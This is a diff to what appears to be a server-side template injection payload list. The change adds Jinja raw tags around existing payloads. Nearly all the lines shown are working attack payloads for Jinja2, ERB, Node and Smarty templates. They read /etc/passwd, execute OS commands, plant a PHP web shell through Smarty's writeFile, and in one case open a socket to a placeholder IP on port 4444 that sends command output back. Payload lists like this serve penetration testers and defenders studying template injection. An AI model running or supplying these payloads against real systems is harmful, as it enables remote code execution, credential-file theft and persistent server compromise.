@@ -180,7 +180,8 @@ $str.valueOf($chr.toChars($out.read()))
 {{4*4}}[[5*5]]
 {{7*'7'}} would result in 7777777
 {{config.items()}}
-<pre>{% debug %}</pre>
+<pre>{% raw %}
+{% debug %}</pre>
 
 #Dump all used classes
 {{ [].class.base.subclasses() }}
@@ -192,6 +193,7 @@ $str.valueOf($chr.toChars($out.read()))
     <dt>{{ key|e }}</dt>
     <dd>{{ value|e }}</dd>
 {% endfor %}
+{% endraw %}
 
 #Read remote file
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
@@ -400,7 +402,8 @@ ${{7*7}}
 <%= IO.popen('ls /').readlines()  %>
 <%= `ls /` %>
 <%= system('cat /etc/passwd') %>
-<pre>{% debug %}</pre>
+<pre>{% raw %}
+{% debug %}</pre>
 @(1+2)
 @(6+5)
 @import (inline) "/etc/passwd";
@@ -411,6 +414,7 @@ body {color: `global.process.mainModule.require("child_process").execSync("id")`
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{% endraw %}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 {php}echo `id`;{/php}
 {php}echo `id`;{/php} //deprecated in smarty v3
